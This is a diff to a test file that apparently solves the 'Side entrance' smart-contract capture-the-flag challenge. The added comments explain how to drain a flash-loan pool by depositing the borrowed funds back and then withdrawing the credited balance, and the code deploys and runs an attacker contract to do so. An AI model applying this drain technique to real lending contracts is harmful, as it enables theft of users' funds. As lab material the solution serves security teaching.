@@ -25,6 +25,14 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //Create contract that has an execute method where it deposits the funds to the flashLoan contract. 
+        //That triggers that when it checks the balance for the repayment of the loan, the conditions are met, but it still
+        //lets us withdraw as the state variable balance has a positive remaining balance. We later call a withdraw function on
+        //the attacker contract to bring does funds and then transfer them to the actual attacker address.
+        const SideEntranceAttackFactory = await ethers.getContractFactory('AttackSideEntranceLenderPool', attacker);
+        this.sideEntranceAttack = await SideEntranceAttackFactory.deploy();
+        await this.sideEntranceAttack.attack(this.pool.address, ETHER_IN_POOL);
+        await this.sideEntranceAttack.withdrawFromPool(this.pool.address);
     });
 
     after(async function () {
